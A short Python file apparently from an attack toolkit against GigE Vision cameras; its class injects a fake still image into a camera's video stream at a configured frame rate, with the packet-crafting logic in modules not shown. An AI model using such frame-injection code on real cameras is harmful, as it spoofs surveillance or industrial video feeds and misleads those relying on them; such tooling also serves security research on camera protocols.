from time import time

from attacker import GigEAttacker


class GigEAttackerFrameInjection(GigEAttacker):
    def attack(self) -> None:
        start_time = time()
        self.set_gige_link()
        time_left = time() - start_time
        # TOOO: check if gvsp payload packets creation is time consuming and better off once
        self.gige_link.fake_still_image(
            img_path=self.config["injection"]["fake_path"],
            duration=time_left,
            frame_rate=1/self.config["timing"]["ampiric_frame_time_in_seconds"],
        )

    def run_attack_stage(self) -> None:
        self.attack()
